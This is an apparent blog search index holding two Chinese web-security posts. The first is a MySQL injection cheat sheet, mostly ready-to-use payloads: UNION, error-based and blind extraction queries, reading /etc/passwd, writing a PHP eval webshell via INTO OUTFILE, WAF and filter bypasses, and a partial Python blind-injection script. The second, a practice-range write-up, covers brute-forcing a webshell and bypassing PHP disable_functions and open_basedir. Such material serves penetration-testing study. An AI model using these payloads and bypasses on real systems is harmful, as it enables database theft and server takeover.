<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>mysql注入备忘录(不断更新...)</title>
      <link href="/2019/08/22/mysql-injection-guide/"/>
      <url>/2019/08/22/mysql-injection-guide/</url>
      
        <content type="html"><![CDATA[<p>记录一下<code>mysql</code>手工注入语句，随拿随用。</p><a id="more"></a><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><h5 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h5><ul><li><code>version()</code></li><li><code>@@version //@@</code>是系统变量</li></ul><h5 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h5><ul><li><code>database()</code></li><li><code>schema()</code></li></ul><h5 id="查看用户"><a href="#查看用户" class="headerlink" title="查看用户"></a>查看用户</h5><ul><li><code>user()</code></li><li><code>current_user()</code></li><li><code>system_user()</code></li></ul><h5 id="查看路径"><a href="#查看路径" class="headerlink" title="查看路径"></a>查看路径</h5><ul><li><code>select @@basedir</code></li></ul><h5 id="字符串相关"><a href="#字符串相关" class="headerlink" title="字符串相关"></a>字符串相关</h5><ul><li><code>length()</code></li><li><code>concat()</code> //连接字符串</li><li><code>concat_ws(flag,s1,s2...)</code> //同<code>concat</code>函数，每个字符要加上<code>flag</code></li><li><code>left(s,n)</code> //返回s开始的最左边n个字符</li><li><code>right(s,n)</code>  //返回s开始的最右边的n个字符</li><li><code>repeat(s,n)</code> //重复字符串s n次</li><li><code>substring(s,n,len)</code>  //获取字符串s从n开始长度为<code>len</code>的字符串</li><li><code>mid(s,n,len)</code>   //同上sub</li><li><code>ascii(s)</code>  // 获取s的<code>ascii</code>值</li><li><code>group_concat()</code> //连接字符串</li></ul><h5 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h5><p><code>if(expr,v1,v2)</code>  // 如果表达式成立，执行<code>v1</code>，否则执行<code>v2</code></p><p><code>case when then</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">case expr</span><br><span class="line">when case1 then 1</span><br><span class="line">when case2 then 2</span><br><span class="line">else 3</span><br><span class="line">end case</span><br></pre></td></tr></table></figure><h4 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h4><ul><li><p>有回显的普通注入</p></li><li><p>报错注入(有回显)</p></li><li><p>头注入(<code>X-Forwarded-For/UA头/cookie注入/...</code>)</p></li><li><p><code>insert</code>注入</p></li><li><p><code>update</code>注入  // 一般为报错注入</p></li><li><p><code>delete</code> 注入 </p></li><li><p>宽字节注入</p></li><li><p>盲注</p><ul><li><p>布尔盲注</p><p>根据返回结果的差异来判断</p></li><li><p>时间盲注</p><p>根据是否延时来判断条件是否成立</p></li></ul></li><li><p>二次注入</p><ul><li><code>insert + select</code>类型</li><li><code>update + select</code>类型</li><li>…</li></ul></li><li><p><code>order by</code>注入</p></li></ul><h4 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h4><ul><li><p>字符型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id =1&apos; and &apos;1&apos;=&apos;1 #</span><br><span class="line">id =1&apos; and &apos;1&apos;=&apos;2 #</span><br><span class="line">id =1&apos; or &apos;1&apos;=&apos;1 #</span><br><span class="line">id =1&apos; or &apos;1&apos;=&apos;2 #</span><br><span class="line"> &apos;  &quot; &apos;) &quot;)   //常见闭合方式</span><br></pre></td></tr></table></figure></li><li><p>数字型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id = 1 and 1 =1 #</span><br><span class="line">id = 2 and 1= 2 #</span><br><span class="line">id = 1 or 1 = 1 #</span><br><span class="line">id = 2 or 1 = 2 #</span><br></pre></td></tr></table></figure></li></ul><h4 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h4><h5 id="有回显普通手工注入"><a href="#有回显普通手工注入" class="headerlink" title="有回显普通手工注入"></a>有回显普通手工注入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">id = 1 order by 3#  // 条件为真，才能进行order by 查询</span><br><span class="line">id = -1 union select 1,2,3 # //前面条件为假，而且前后查询列数要相等</span><br><span class="line"></span><br><span class="line">SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA #</span><br><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() #</span><br><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database_name #</span><br><span class="line">SELECT GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=table_name # </span><br><span class="line">SELECT GROUP_CONCAT(column_1,column_2) FROM database_name.table_name #</span><br><span class="line">SELECT load_file(&apos;/etc/passwd&apos;)</span><br><span class="line">SELECT &apos;&lt;?php @eval($_POST[1]);?&gt;&apos; into outfile &apos;/var/www/html/shell.php&apos;;</span><br><span class="line">show variables like &apos;%secure%&apos;; // 查看权限</span><br><span class="line">secure_file_priv=  可以读取目录</span><br><span class="line">secure_file_priv=NULL 不能读取</span><br><span class="line">secure_file_priv=C:\  只能读取C盘</span><br></pre></td></tr></table></figure><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><h6 id="updatexml-长度限制-32位"><a href="#updatexml-长度限制-32位" class="headerlink" title="updatexml(长度限制 32位)"></a>updatexml(长度限制 32位)</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line">id=1 and (updatexml(1,concat(0x7e,(select database()),0x7e),1))</span><br><span class="line">id=1 and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&apos;test&apos;),0x7e),1))</span><br><span class="line">id=1 and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;test&apos; and table_name=&apos;user&apos;),0x7e),1))</span><br><span class="line"> id=1 and (updatexml(1,concat(0x7e,(select group_concat(password) from user),0x7e),1))</span><br></pre></td></tr></table></figure><h6 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp(~(select * from(select group_concat(table_name) from information_schema.tables where !(table_schema &lt;&gt; database()))a)) or &apos;</span><br></pre></td></tr></table></figure><h6 id="extractvaluel-长度限制-32位"><a href="#extractvaluel-长度限制-32位" class="headerlink" title="extractvaluel(长度限制 32位)"></a>extractvaluel(长度限制 32位)</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select database()),0x7e)))</span><br><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&apos;test&apos;),0x7e)))</span><br><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;test&apos; and table_name=&apos;user&apos;),0x7e)))</span><br><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select group_concat(password) from user),0x7e)))</span><br></pre></td></tr></table></figure><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p><code>BENCHMARK(100000,MD5(1)) or sleep(5)</code></p><p>附上一个半成品吧，根据情况定制payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">result = &apos;&apos;</span><br><span class="line">flag=the symbol of successful_data</span><br><span class="line">url = &quot;http:/xxx.com/index.php&quot;</span><br><span class="line">request = requests.session()</span><br><span class="line">prox = &#123;&quot;http&quot;:&quot;127.0.0.1:8080&quot;&#125;</span><br><span class="line">header=&#123;</span><br><span class="line"></span><br><span class="line">&quot;Host&quot;: &quot;test.dns.outnet&quot;,</span><br><span class="line">&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&quot;,</span><br><span class="line">&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,</span><br><span class="line">&quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    &quot;username&quot;:&quot;admin&quot;</span><br><span class="line">&#125;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in range(23,126):</span><br><span class="line"></span><br><span class="line">        payload = &quot; &apos; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=the_name_of_table),&#123;0&#125;,1))=&#123;1&#125;  # &quot;.format(i,j)</span><br><span class="line">        #payload = &quot; &apos; or ascii(substr((select a from b),&#123;0&#125;,1))=&#123;1&#125;  # &quot;.format(i,j)</span><br><span class="line">        response = request.post(url=url,data=data,proxies=prox)</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        if flag in response.text:</span><br><span class="line">            result += chr(j)</span><br><span class="line">            print(t)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><h5 id="DNSlog无回显注入"><a href="#DNSlog无回显注入" class="headerlink" title="DNSlog无回显注入"></a>DNSlog无回显注入</h5><p>没实践过，先记一下。</p><p><a href="https://www.cnblogs.com/afanti/p/8047530.html" target="_blank" rel="noopener">https://www.cnblogs.com/afanti/p/8047530.html</a></p><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><h5 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/**/ /*!*/</span><br><span class="line"></span><br><span class="line">union/**/select</span><br><span class="line">/*！union*/select</span><br></pre></td></tr></table></figure><h5 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h5><p>双写或者大小绕过</p><p><code>e.g:</code></p><p><code>Uniunionon</code> <code>SeleSElectct</code></p><h5 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h5><p>使用<code>join</code>函数代替</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3</span><br><span class="line">select (select 1)a join (select 2)b join (select 3)c</span><br></pre></td></tr></table></figure><h5 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h5><p>使用十六进制编码</p><h5 id="正则匹配最大次数限制"><a href="#正则匹配最大次数限制" class="headerlink" title="正则匹配最大次数限制"></a>正则匹配最大次数限制</h5><p>绕某些<code>WAF</code>时有奇效</p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><h4 id="杂七杂八"><a href="#杂七杂八" class="headerlink" title="杂七杂八"></a>杂七杂八</h4><p>查询字段名为关键字时需要使用反引号转义</p><p>数据库数据可能存在宽字节，需要转成十六进制再转成十进制。</p><p>….</p><p>推荐破哥总结的注入笔记，破哥出品，必定精品~</p><p><a href="https://p0sec.net/index.php/archives/117/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/117/</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个shell引发的思考</title>
      <link href="/2019/08/18/shell-analy/"/>
      <url>/2019/08/18/shell-analy/</url>
      
        <content type="html"><![CDATA[<h4 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h4><p>最近在做内部靶场平台题目，其中一道题为爆破一句话木马，拿到key的值。</p><a id="more"></a><h4 id="经过"><a href="#经过" class="headerlink" title="经过"></a>经过</h4><p>木马密码可以通过burp爆破得到</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190818120456.png" alt></p><p>祭出菜刀，连上一句话，发现权限被限制的很死，基本关于文件操作以及命令执行的函数都被禁用了..</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190818120834.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190818120911.png" alt></p><p>但是没有禁用<code>file_get_contents</code>函数，所以可以直接读取文件获得key。</p><p>如果在实际中遇到这种环境，函数被禁，怎么绕过<code>disable_function</code>？</p><p>绕过姿势，一般有这么几种：</p><ul><li><p>寻找未被禁用的函数</p></li><li><p>系统组件绕过</p></li><li><p>通过<code>LD_PRELOAD</code>绕过</p></li><li><p><code>mod-cgi</code> 绕过</p></li><li><p>执行自定义语句(自己实现函数功能，通过<code>webshell</code>执行)</p></li></ul><h5 id="第一种-敏感函数"><a href="#第一种-敏感函数" class="headerlink" title="第一种  敏感函数"></a>第一种  敏感函数</h5><p>整理一下经常用的各类函数，方便查找。</p><p><code>php</code>中读取文件可以使用以下函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">readfile</span><br><span class="line">fread</span><br><span class="line">file_get_contents</span><br><span class="line">var_dump(file(file_name)) // file函数返回值位数组</span><br><span class="line">show_source</span><br><span class="line">hightlight_file</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>在<code>php</code>中可以执行命令函数有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system,exec,shell_exec,passthru，pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link</span><br></pre></td></tr></table></figure><p>列目录函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">opendir</span><br><span class="line">scandir</span><br><span class="line">glob(&apos;*&apos;) </span><br><span class="line">$path = dirname(__FILE__);</span><br><span class="line">$result = glob($path.&apos;/*.php&apos;);</span><br><span class="line">print_r($result);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="第二种-三方组件"><a href="#第二种-三方组件" class="headerlink" title="第二种 三方组件"></a>第二种 三方组件</h5><p>利用系统存在的组件漏洞执行命令，扩大战果。</p><ul><li>Bash漏洞导致命令执行</li><li><code>ImageMagic</code>绕过</li><li><code>imagecreatefromgd2</code></li><li><code>sendmail</code> </li></ul><h5 id="第三种-LD-PRELOAD"><a href="#第三种-LD-PRELOAD" class="headerlink" title="第三种 LD_PRELOAD"></a>第三种 LD_PRELOAD</h5><p>使用<code>LD_PRELOAD</code></p><p>程序执行时要在动态链接库<code>.so</code>中寻找函数位置，这种绕过方式就是让程序去执行自定义的动态链接库，类似于<code>mysql</code>下的<code>udf</code>提权或者<code>redis</code>主从复制<code>RCE</code>方式。</p><p><code>LD_PRELOAD</code>这个全局变量指定动态链接库文件，会在程序运行之前加载。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_PRELOAD = XXX/xx.so</span><br></pre></td></tr></table></figure><p>如果可以上传文件，我们可以通过上传一个恶意的.so库文件，然后加载该文件。最后绕过<code>php</code>层面执行命令函数。</p><p>推荐一个复现环境：</p><p><a href="https://github.com/obolu/Bypass_Disable_functions" target="_blank" rel="noopener">https://github.com/obolu/Bypass_Disable_functions</a></p><h5 id="第四种-mod-cgi-htaccess"><a href="#第四种-mod-cgi-htaccess" class="headerlink" title="第四种  mod_cgi+.htaccess"></a>第四种  mod_cgi+.htaccess</h5><p>在启用<code>mod_cgi</code>的apache服务器中，必须允许<code>.htaccess</code>以及有可写权限，要求有点苛刻。</p><p>在apache配置中有<code>Options</code>以及<code>Addhandler</code>指令，前者用来控制目录选项，比方说是否允许目录遍历，是否允许访问等，后者用来指定特定后缀名的文件所对应的处理方式，在解析漏洞中就有这样的用法，上传带少见后缀的恶意文件，修改<code>.htaccess</code>文件达到执行代码的目的。</p><p>这种绕过方式就是通过将要执行的程序写入带有特定拓展名的文件内，修改<code>.htaccess</code>文件，将恶意文件交给<code>cgi</code>处理。</p><p>具体的原理可以查阅 <a href="https://www.cnblogs.com/hookjoy/p/8988862.html" target="_blank" rel="noopener">https://www.cnblogs.com/hookjoy/p/8988862.html</a></p><h5 id="第五种-自定义语句"><a href="#第五种-自定义语句" class="headerlink" title="第五种 自定义语句"></a>第五种 自定义语句</h5><p>通过编写<code>php</code>代码，用<code>php</code>最基础的底层函数实现一些被禁用的函数。</p><p>在本题目中，常见的列目录函数被禁用，包括<code>readdir</code>，<code>opendir</code>等函数，可以使用自定义语句列目录，也可以使用<code>scandir</code>函数。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190818152208.png" alt></p><p>想到可以读其他路径文件，说不定可以读到一些服务器的敏感信息啥的，看一下<code>phpinfo</code>中的<code>open_basedir</code>配置，限定了访问目录，只能访该题目所在目录。</p><p>查阅资料后发现，可以通过<code>glob</code>伪协议绕过限制，读取栏目。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$path = dirname(__FILE__);</span><br><span class="line">$result = glob($path.&apos;/*.php&apos;);</span><br><span class="line">print_r($result);</span><br><span class="line"></span><br><span class="line">//简化版</span><br><span class="line">$a = &quot;glob:///*&quot;;print_r(scandir($a));</span><br></pre></td></tr></table></figure><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190818152937.png" alt></p><p>可以看到读到了根目录，但是没有足够权限读取/root/下的文件。需要借助其他的方式提升权限。</p><p>最后发现该靶机是一台虚拟主机之类的单独空间，没有其他题目的key，== ！ 姜还是老的辣啊2333</p><p>最后附上<code>l3m0n</code>大佬的<code>github</code>链接，里边记录了各种绕过姿势</p><p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></p><p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
